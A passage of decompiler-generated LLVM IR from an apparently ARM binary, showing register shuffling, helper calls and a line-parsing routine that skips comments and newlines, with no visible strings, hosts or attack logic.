  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1327c ], [ 0, %dec_label_pc_13234 ], [ %stack_var_-212.2, %dec_label_pc_131f0 ]
  %v1_13288 = add i32 %stack_var_-192.0, 1
  %v0_13290 = load i32, i32* @r5, align 4
  %v2_13290 = add i32 %v0_13290, %v5_13160
  store i32 %v2_13290, i32* @r5, align 4
  br label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %dec_label_pc_13138, %dec_label_pc_13280
  %v0_13154 = phi i32 [ %v0_13128, %dec_label_pc_13138 ], [ %v2_13290, %dec_label_pc_13280 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_13138 ], [ %stack_var_-212.1, %dec_label_pc_13280 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_13138 ], [ %v1_13288, %dec_label_pc_13280 ]
  %v2_1329c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1329c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1329c = xor i32 %v2_1329c, %stack_var_-192.0
  %v6_1329c = and i32 %v5_1329c, %v4_1329c
  %v5_132a0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_132a0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_13294
  %v7_132a0 = load i32, i32* @fp, align 4
  %v8_132a0 = sub i32 %v0_13154, %v7_132a0
  %v10_132a0 = xor i32 %v7_132a0, %v0_13154
  %v11_132a0 = xor i32 %v8_132a0, %v0_13154
  %v12_132a0 = and i32 %v11_132a0, %v10_132a0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_13294, %bb204
  %v1_132a4.in = phi i32 [ %v6_1329c, %dec_label_pc_13294 ], [ %v12_132a0, %bb204 ]
  %v0_132a4.in = phi i32 [ %v2_1329c, %dec_label_pc_13294 ], [ %v8_132a0, %bb204 ]
  %v0_132a4 = icmp slt i32 %v0_132a4.in, 0
  %v1_132a4 = icmp slt i32 %v1_132a4.in, 0
  %v2_132a4 = xor i1 %v1_132a4, %v0_132a4
  br i1 %v2_132a4, label %dec_label_pc_1314c, label %dec_label_pc_132a8

dec_label_pc_132a8:                               ; preds = %dec_label_pc_1317c, %bb203, %dec_label_pc_131fc, %dec_label_pc_131c8, %bb205
  %v1_132ac = call i32 @function_cbe4(i32 %v3_12f8c)
  %v3_132b0 = load i32, i32* %stack_var_0, align 4
  %v2_132b4 = icmp eq i32 %v3_132b0, 0
  br i1 %v2_132b4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_132a8
  %v1_132bc = load i32, i32* @r7, align 4
  %v3_132b8 = inttoptr i32 %v3_132b0 to i32*
  store i32 %v1_132bc, i32* %v3_132b8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_132a8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 78532, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_132b4, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  %v2_132c4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_132c4, i32* @r0, align 4
  store i32 %v2_12d58, i32* @r4, align 4
  %v0_132cc = call i32 @function_fdcc()
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_132e4 = call i32 @function_10d54()
  %v1_132f4 = call i32 @function_10d4c()
  %v0_13300 = load i32, i32* @r6, align 4
  %v3_13300 = sdiv i32 %v0_13300, 256
  %v0_13304 = load i32, i32* @sl, align 4
  store i32 %v0_13304, i32* @global_var_22cb0.573, align 4
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_13310 = trunc i32 %v3_13300 to i8
  store i8 %v1_13310, i8* @global_var_205fd.576, align 1
  %v1_13314 = trunc i32 %v0_13300 to i8
  store i8 %v1_13314, i8* bitcast (i8** @global_var_205fc.575 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_13324.587 to i32), i32* @lr, align 4
  %v1_13320 = call i32 @function_10d54()
  %v0_134ac.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_134ac

dec_label_pc_13328:                               ; preds = %dec_label_pc_12fbc, %dec_label_pc_12fdc
  %v0_13328 = load i32, i32* @sl, align 4
  %v1_13328 = add i32 %v0_13328, 1
  %v2_13330 = call i32 @function_cafc(i32 %v1_13328, i32 %arg3)
  store i32 %v2_13330, i32* @sl, align 4
  %v2_13334 = icmp eq i32 %v2_13330, 0
  br i1 %v2_13334, label %dec_label_pc_1333c, label %dec_label_pc_133f4.backedge

dec_label_pc_1333c:                               ; preds = %dec_label_pc_13328
  %v1_13344 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_133f8.outer.backedge

dec_label_pc_133f8.outer.backedge:                ; preds = %dec_label_pc_1333c, %dec_label_pc_133d8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_130d0, %.thread19 ], [ -1, %dec_label_pc_133d8 ], [ -1, %dec_label_pc_1333c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_133e0, %dec_label_pc_133d8 ], [ %v1_13344, %dec_label_pc_1333c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_12ddc.lr.ph, label %dec_label_pc_13414

dec_label_pc_13354:                               ; preds = %dec_label_pc_1324c
  %v1_13354 = inttoptr i32 %v0_1324c to i32*
  %v2_13354 = load i32, i32* %v1_13354, align 4
  store i32 %v2_13354, i32* @r0, align 4
  %v0_13358 = call i32 @function_fdcc()
  br label %dec_label_pc_1335c

dec_label_pc_1335c:                               ; preds = %dec_label_pc_130ec, %dec_label_pc_13040, %dec_label_pc_1317c, %dec_label_pc_13170, %dec_label_pc_13058, %dec_label_pc_13020, %dec_label_pc_13354
  br i1 %v2_13360, label %dec_label_pc_13368, label %dec_label_pc_133c4

dec_label_pc_13368:                               ; preds = %dec_label_pc_1335c
  store i32 %v2_12d58, i32* @r5, align 4
  store i32 %v2_12d58, i32* @r0, align 4
  %v1_13380 = call i32 @function_10d54()
  %v1_13390 = call i32 @function_10d4c()
  %v2_1339c = load i32, i32* @global_var_22f10.581, align 4
  store i32 %v2_12d58, i32* @r0, align 4
  store i32 78768, i32* @lr, align 4
  %v1_133ac = call i32 @function_10d54()
  %v1_133b4 = add i32 %v2_1339c, -1
  store i32 %v1_133b4, i32* @r4, align 4
  %v5_133bc = icmp slt i32 %v6_133bc, %v1_133b4
  br i1 %v5_133bc, label %.thread27, label %dec_label_pc_133c4

.thread27:                                        ; preds = %dec_label_pc_13368
  %v7_133bc = add i32 %v6_133bc, 1
  br label %dec_label_pc_133f4.backedge

dec_label_pc_133c4:                               ; preds = %dec_label_pc_13368, %dec_label_pc_1335c
  %v0_133c4 = load i32, i32* @sl, align 4
  %v1_133c4 = add i32 %v0_133c4, 1
  %v2_133cc = call i32 @function_cafc(i32 %v1_133c4, i32 %arg3)
  store i32 %v2_133cc, i32* @sl, align 4
  %v2_133d0 = icmp eq i32 %v2_133cc, 0
  br i1 %v2_133d0, label %dec_label_pc_133d8, label %dec_label_pc_133f4.backedge

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133c4
  %v1_133e0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_133f8.outer.backedge

dec_label_pc_133f4.backedge:                      ; preds = %dec_label_pc_13328, %dec_label_pc_133c4, %.thread27
  %storemerge87 = phi i32 [ %v7_133bc, %.thread27 ], [ -1, %dec_label_pc_133c4 ], [ -1, %dec_label_pc_13328 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_12ddc.lr.ph.preheader, label %dec_label_pc_13414

dec_label_pc_12ddc.lr.ph.preheader:               ; preds = %dec_label_pc_12ddc.lr.ph.preheader.lr.ph, %dec_label_pc_133f4.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_12ddc.lr.ph.preheader.lr.ph ], [ %v3_12f8c, %dec_label_pc_133f4.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_12dd4, %dec_label_pc_12ddc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_133f4.backedge ]
  %v0_133f4259 = phi i32 [ -1, %dec_label_pc_12ddc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_133f4.backedge ]
  br label %dec_label_pc_12ddc.lr.ph

dec_label_pc_12ddc.lr.ph:                         ; preds = %dec_label_pc_12ddc.lr.ph.preheader, %dec_label_pc_133f8.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v3_12f8c, %dec_label_pc_133f8.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_12ddc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_133f8.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_12ddc.lr.ph.preheader ]
  %v6_133bc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_133f8.outer.backedge ], [ %v0_133f4259, %dec_label_pc_12ddc.lr.ph.preheader ]
  %v1_12e84 = icmp slt i32 %v6_133bc, 0
  %v4_12ec0 = mul i32 %v6_133bc, 4
  %v5_12ec0 = add i32 %v4_12ec0, ptrtoint (i32* @global_var_22ef0.585 to i32)
  %v6_12ec0 = inttoptr i32 %v5_12ec0 to i32*
  br label %dec_label_pc_12ddc

dec_label_pc_13408:                               ; preds = %bb195, %.thread8, %dec_label_pc_12d34, %dec_label_pc_12d28
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_12d44, %dec_label_pc_133f4.backedge, %dec_label_pc_133f8.outer.backedge, %bb200, %dec_label_pc_12ecc, %dec_label_pc_133f8.backedge, %dec_label_pc_13408
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_13408 ], [ %v3_12f8c, %dec_label_pc_133f8.backedge ], [ %v1_12de4, %dec_label_pc_12ecc ], [ %v1_12de4, %bb200 ], [ %v3_12f8c, %dec_label_pc_133f8.outer.backedge ], [ -1, %dec_label_pc_12d44 ], [ %v3_12f8c, %dec_label_pc_133f4.backedge ]
  %v0_13414 = call i32 @function_11514()
  %v2_1341c = inttoptr i32 %v0_13414 to i32*
  store i32 -1, i32* %v2_1341c, align 4
  %v0_13420 = load i32, i32* @sb, align 4
  store i32 %v0_13420, i32* @r6, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_13110, %dec_label_pc_13414
  %v1_1342c = phi i32 [ %stack_var_-216.2, %dec_label_pc_13414 ], [ %v3_12f8c, %dec_label_pc_13110 ]
  %v7_13428 = icmp eq i32 %v1_1342c, -1
  br i1 %v7_13428, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_13424
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_13424, %bb208
  store i32 78900, i32* @lr, align 4
  %v1_13430 = xor i1 %v7_13428, true
  call void @__pseudo_cond_branch(i1 %v1_13430, i32 ptrtoint (i32* @global_var_cbe4.578 to i32))
  %v2_13434 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_13434, i32* @r0, align 4
  %v0_13438 = call i32 @function_fdcc()
  %v0_1343c = load i32, i32* @r7, align 4
  store i32 %v0_1343c, i32* @r0, align 4
  %v0_13440 = call i32 @function_fdcc()
  %v0_13444 = load i32, i32* @sl, align 4
  %v7_13444 = icmp eq i32 %v0_13444, -1
  br i1 %v7_13444, label %bb210, label %dec_label_pc_13450

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_134ac

dec_label_pc_13450:                               ; preds = %bb209
  %v2_13450 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_13450, i32* @r0, align 4
  %v1_13468 = call i32 @function_10d54()
  %v1_13478 = call i32 @function_10d4c()
  %v0_13484 = load i32, i32* @r6, align 4
  %v3_13484 = sdiv i32 %v0_13484, 256
  %v0_13488 = load i32, i32* @sl, align 4
  store i32 %v0_13488, i32* @global_var_22cb0.573, align 4
  store i32 %v2_13450, i32* @r0, align 4
  %v1_13494 = trunc i32 %v3_13484 to i8
  store i8 %v1_13494, i8* @global_var_205fd.576, align 1
  %v1_13498 = trunc i32 %v0_13484 to i8
  store i8 %v1_13498, i8* bitcast (i8** @global_var_205fc.575 to i8*), align 4
  store i32 79016, i32* @lr, align 4
  %v1_134a4 = call i32 @function_10d54()
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %bb210, %bb207, %dec_label_pc_13450
  %v0_134ac = phi i32 [ %v0_13444, %bb210 ], [ %v0_134ac.pre, %bb207 ], [ -1, %dec_label_pc_13450 ]
  store i32 %v3_12ce0, i32* @r4, align 4
  store i32 %v6_12ce0, i32* @r5, align 4
  store i32 %v9_12ce0, i32* @r6, align 4
  store i32 %v12_12ce0, i32* @r7, align 4
  store i32 %v15_12ce0, i32* @r8, align 4
  store i32 %v18_12ce0, i32* @sb, align 4
  store i32 %v21_12ce0, i32* @sl, align 4
  ret i32 %v0_134ac

; uselistorder directives
  uselistorder i32 %v0_13484, { 1, 0 }
  uselistorder i32 %v0_13444, { 1, 0 }
  uselistorder i1 %v7_13428, { 1, 0 }
  uselistorder i32 %v6_133bc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_13300, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_13154, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1324c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1320c, { 1, 0 }
  uselistorder i32 %v0_1312c, { 1, 0 }
  uselistorder i32 %v0_13130, { 1, 0 }
  uselistorder i32 %v5_13030, { 1, 0 }
  uselistorder i32 %v3_12f8c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_12ef8, { 1, 0 }
  uselistorder i32 %v2_12e98, { 1, 0 }
  uselistorder i32 %v1_12e10, { 1, 2, 0 }
  uselistorder i1 %v7_12de0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_12de4, { 1, 2, 0 }
  uselistorder i32 %v0_12dd4, { 1, 0 }
  uselistorder i32 %v2_12d58, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_cbe4, { 4, 11, 10, 9, 8, 7, 6, 0, 13, 12, 5, 3, 2, 1 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_fb64, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_fc4c, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 10, 3, 6, 4, 7, 5, 8, 2, 9, 12, 11, 0 }
  uselistorder i32 (i32)* @function_f730, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_f1d0, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_205fd.576, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_cafc, { 6, 5, 4, 3, 7, 8, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fc78, { 3, 8, 10, 11, 4, 2, 0, 9, 7, 6, 1, 5 }
  uselistorder i32 512, { 3, 4, 1, 5, 2, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_134ac, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_13424, { 1, 0 }
  uselistorder label %dec_label_pc_13414, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_13408, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12ddc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_133f4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1335c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_133f8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13328, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_132a8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_13294, { 1, 0 }
  uselistorder label %dec_label_pc_13280, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1327c, { 1, 0 }
  uselistorder label %dec_label_pc_131e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13120, { 1, 0 }
  uselistorder label %dec_label_pc_13110, { 1, 0 }
  uselistorder label %dec_label_pc_133f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12f78, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_12ecc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @function_134b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_134b8:
  %v0_134b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_134b8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_134b8
  %v5_134b8 = mul i32 %arg2, 256
  %v6_134b8 = and i32 %v5_134b8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_134b8, %bb
  %v10_134e8 = phi i32 [ %arg1, %dec_label_pc_134b8 ], [ %v6_134b8, %bb ]
  ret i32 %v10_134e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_134ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_134ec:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_134ec = load i32, i32* @r4, align 4
  store i32 %v3_134ec, i32* %stack_var_-28, align 4
  %v6_134ec = load i32, i32* @r5, align 4
  %v9_134ec = load i32, i32* @r6, align 4
  %v12_134ec = load i32, i32* @r7, align 4
  %v15_134ec = load i32, i32* @r8, align 4
  %v18_134ec = load i32, i32* @sl, align 4
  %v2_134f0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_134f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_134f4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_20600.430 to i32), i32* %r2.global-to-local, align 4
  %v1_13508 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_20600.430 to i32), i32* %r0.global-to-local, align 4
  store i32 79132, i32* @lr, align 4
  %v1_13518 = call i32 @function_10d4c()
  store i32 %v1_13518, i32* %r0.global-to-local, align 4
  %v2_13520 = load i32, i32* @global_var_22f0c.435, align 4
  %v5_13528 = icmp sgt i32 %v2_13520, 0
  br i1 %v5_13528, label %dec_label_pc_13764, label %dec_label_pc_1352c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_134ec
  store i32 ptrtoint ([17 x i8]* @global_var_1812c.594 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18140.596 to i32), i32* @r1, align 4
  %v3_13534 = call i32 @function_d050(i32 ptrtoint ([17 x i8]* @global_var_1812c.594 to i32), i32 ptrtoint (i32* @global_var_18140.596 to i32))
  store i32 %v3_13534, i32* %r0.global-to-local, align 4
  store i32 %v3_13534, i32* @sl, align 4
  %v2_13538 = icmp eq i32 %v3_13534, 0
  br i1 %v2_13538, label %dec_label_pc_13540, label %dec_label_pc_1372c.preheader

dec_label_pc_13540:                               ; preds = %dec_label_pc_1352c
  store i32 ptrtoint ([24 x i8]* @global_var_18144.598 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18140.596 to i32), i32* @r1, align 4
  %v3_13548 = call i32 @function_d050(i32 ptrtoint ([24 x i8]* @global_var_18144.598 to i32), i32 ptrtoint (i32* @global_var_18140.596 to i32))
  store i32 %v3_13548, i32* %r0.global-to-local, align 4
  store i32 %v3_13548, i32* @sl, align 4
  %v2_1354c = icmp eq i32 %v3_13548, 0
  br i1 %v2_1354c, label %dec_label_pc_13758, label %dec_label_pc_1372c.preheader

dec_label_pc_1372c.preheader:                     ; preds = %dec_label_pc_1352c, %dec_label_pc_13540
  %v0_1373426 = phi i32 [ %v3_13534, %dec_label_pc_1352c ], [ %v3_13548, %dec_label_pc_13540 ]
  %v2_135a0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1363c = inttoptr i32 %tmp to i8*
  store i32 %v2_134f0, i32* %r0.global-to-local, align 4
  store i32 %v0_1373426, i32* %r2.global-to-local, align 4
  %v3_1373866 = call i32 @function_e7bc(i32 %v2_134f0, i32 128, i32 %v0_1373426)
  store i32 %v3_1373866, i32* %r0.global-to-local, align 4
  %v2_1373c68 = icmp eq i32 %v3_1373866, 0
  store i32 %v2_134f0, i32* @r4, align 4
  br i1 %v2_1373c68, label %dec_label_pc_1374c, label %dec_label_pc_1355c.preheader.lr.ph

dec_label_pc_1355c.preheader.lr.ph:               ; preds = %dec_label_pc_1372c.preheader
  %v1_1355c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_1355c.preheader

dec_label_pc_13558:                               ; preds = %dec_label_pc_13568
  %v1_13558 = add i32 %v0_13558, 1
  store i32 %v1_13558, i32* %r0.global-to-local, align 4
  %v1_1355c = inttoptr i32 %v1_13558 to i8*
  %v2_1355c = load i8, i8* %v1_1355c, align 1
  %v3_1355c = zext i8 %v2_1355c to i32
  store i32 %v3_1355c, i32* %r2.global-to-local, align 4
  %v2_13560 = icmp eq i8 %v2_1355c, 0
  br i1 %v2_13560, label %dec_label_pc_1357c, label %dec_label_pc_13568

dec_label_pc_13568:                               ; preds = %dec_label_pc_13568.lr.ph, %dec_label_pc_13558
  %v0_13558 = phi i32 [ %v2_134f0, %dec_label_pc_13568.lr.ph ], [ %v1_13558, %dec_label_pc_13558 ]
  %v1_13570 = phi i32 [ %v3_1355c13, %dec_label_pc_13568.lr.ph ], [ %v3_1355c, %dec_label_pc_13558 ]
  %v3_13570 = mul nuw nsw i32 %v1_13570, 2
  %v4_13570 = add i32 %v3_13570, %v2_1356c.pre
  %v5_13570 = inttoptr i32 %v4_13570 to i8*
  %v6_13570 = load i8, i8* %v5_13570, align 1
  %v1_13574 = and i8 %v6_13570, 32
  %v2_13574 = icmp eq i8 %v1_13574, 0
  br i1 %v2_13574, label %dec_label_pc_1357c, label %dec_label_pc_13558

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13558, %dec_label_pc_13568, %dec_label_pc_1355c.preheader
  %v0_1361435 = phi i32 [ %v2_134f0, %dec_label_pc_1355c.preheader ], [ %v1_13558, %dec_label_pc_13558 ], [ %v0_13558, %dec_label_pc_13568 ]
  %v0_13590 = phi i32 [ %v3_1355c13, %dec_label_pc_1355c.preheader ], [ %v3_1355c, %dec_label_pc_13558 ], [ %v1_13570, %dec_label_pc_13568 ]
  %v7_1357c = icmp eq i32 %v0_13590, 10
  br i1 %v7_1357c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1357c
  %v3_13580 = icmp eq i32 %v0_13590, 0
  br i1 %v3_13580, label %bb55, label %dec_label_pc_13590

.thread3:                                         ; preds = %dec_label_pc_1357c
  br label %dec_label_pc_1372c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1372c.backedge

dec_label_pc_1372c.backedge:                      ; preds = %dec_label_pc_13708, %dec_label_pc_13720, %bb55, %dec_label_pc_136a0, %.thread3, %dec_label_pc_13590
  %v0_13734.pre = load i32, i32* @sl, align 4
  store i32 %v2_134f0, i32* %r0.global-to-local, align 4
  store i32 %v0_13734.pre, i32* %r2.global-to-local, align 4
  %v3_13738 = call i32 @function_e7bc(i32 %v2_134f0, i32 128, i32 %v0_13734.pre)
  store i32 %v3_13738, i32* %r0.global-to-local, align 4
  %v2_1373c = icmp eq i32 %v3_13738, 0
  store i32 %v2_134f0, i32* @r4, align 4
  br i1 %v2_1373c, label %dec_label_pc_1374c, label %dec_label_pc_1355c.preheader

dec_label_pc_13590:                               ; preds = %bb
  %v7_13590 = icmp eq i32 %v0_13590, 35
  br i1 %v7_13590, label %dec_label_pc_1372c.backedge, label %dec_label_pc_13614

dec_label_pc_135a0:                               ; preds = %bb58
  store i32 %v2_135a0, i32* %r2.global-to-local, align 4
  %v4_135a4 = mul i32 %storemerge, 4
  %v5_135a4 = add i32 %v4_135a4, %v2_135a0
  %v2_135a8 = add i32 %v5_135a4, -36
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  store i32 %v0_135a8, i32* %v3_135a8, align 4
  %v0_135b415 = load i32, i32* %r0.global-to-local, align 4
  %v1_135b416 = inttoptr i32 %v0_135b415 to i8*
  %v2_135b417 = load i8, i8* %v1_135b416, align 1
  %v3_135b418 = zext i8 %v2_135b417 to i32
  store i32 %v3_135b418, i32* %r2.global-to-local, align 4
  %v2_135b819 = icmp eq i8 %v2_135b417, 0
  br i1 %v2_135b819, label %dec_label_pc_135e8.preheader, label %dec_label_pc_135c0.lr.ph

dec_label_pc_135c0.lr.ph:                         ; preds = %dec_label_pc_135a0
  %v2_135c4.pre = load i32, i32* @global_var_205f0, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135b0:                               ; preds = %dec_label_pc_135d4
  %v1_135b0 = add i32 %v0_135b0, 1
  store i32 %v1_135b0, i32* %r0.global-to-local, align 4
  %v1_135b4 = inttoptr i32 %v1_135b0 to i8*
  %v2_135b4 = load i8, i8* %v1_135b4, align 1
  %v3_135b4 = zext i8 %v2_135b4 to i32
  store i32 %v3_135b4, i32* %r2.global-to-local, align 4
  %v2_135b8 = icmp eq i8 %v2_135b4, 0
  br i1 %v2_135b8, label %dec_label_pc_135e8.preheader, label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135c0.lr.ph, %dec_label_pc_135b0
  %v0_135b0 = phi i32 [ %v0_135b415, %dec_label_pc_135c0.lr.ph ], [ %v1_135b0, %dec_label_pc_135b0 ]
  %v0_135d4 = phi i32 [ %v3_135b418, %dec_label_pc_135c0.lr.ph ], [ %v3_135b4, %dec_label_pc_135b0 ]
  %v3_135c8 = mul nuw nsw i32 %v0_135d4, 2
  %v4_135c8 = add i32 %v3_135c8, %v2_135c4.pre
  %v5_135c8 = inttoptr i32 %v4_135c8 to i8*
  %v6_135c8 = load i8, i8* %v5_135c8, align 1
  %v1_135cc = and i8 %v6_135c8, 32
  %v2_135cc = icmp eq i8 %v1_135cc, 0
  br i1 %v2_135cc, label %dec_label_pc_135d4, label %dec_label_pc_135e8.preheader

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135c0
  %v7_135d4 = icmp eq i32 %v0_135d4, 10
  br i1 %v7_135d4, label %dec_label_pc_135e8.preheader, label %dec_label_pc_135b0

dec_label_pc_135e8.preheader:                     ; preds = %dec_label_pc_135d4, %dec_label_pc_135c0, %dec_label_pc_135b0, %dec_label_pc_135a0
  %v0_135e820 = phi i32 [ %v0_135b415, %dec_label_pc_135a0 ], [ %v0_135b0, %dec_label_pc_135d4 ], [ %v0_135b0, %dec_label_pc_135c0 ], [ %v1_135b0, %dec_label_pc_135b0 ]
  %v1_135e821 = inttoptr i32 %v0_135e820 to i8*
  %v2_135e822 = load i8, i8* %v1_135e821, align 1
  %v3_135e823 = zext i8 %v2_135e822 to i32
  store i32 %v3_135e823, i32* %r2.global-to-local, align 4
  %v2_135ec24 = icmp eq i8 %v2_135e822, 0
  br i1 %v2_135ec24, label %dec_label_pc_13610, label %dec_label_pc_135f4

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135f4, %dec_label_pc_13608
  %v3_135e4 = inttoptr i32 %v2_135e4 to i8*
  store i8 0, i8* %v3_135e4, align 1
  %v4_135e4 = load i32, i32* %r0.global-to-local, align 4
  %v5_135e4 = add i32 %v4_135e4, 1
  store i32 %v5_135e4, i32* %r0.global-to-local, align 4
  %v1_135e8 = inttoptr i32 %v5_135e4 to i8*
  %v2_135e8 = load i8, i8* %v1_135e8, align 1
  %v3_135e8 = zext i8 %v2_135e8 to i32
  store i32 %v3_135e8, i32* %r2.global-to-local, align 4
  %v2_135ec = icmp eq i8 %v2_135e8, 0
  br i1 %v2_135ec, label %dec_label_pc_13610, label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_135e8.preheader, %dec_label_pc_135e0
  %v0_13608 = phi i32 [ %v3_135e8, %dec_label_pc_135e0 ], [ %v3_135e823, %dec_label_pc_135e8.preheader ]
  %v2_135e4 = phi i32 [ %v5_135e4, %dec_label_pc_135e0 ], [ %v0_135e820, %dec_label_pc_135e8.preheader ]
  %v2_135f8 = load i32, i32* @global_var_205f0, align 4
  %v3_135fc = mul nuw nsw i32 %v0_13608, 2
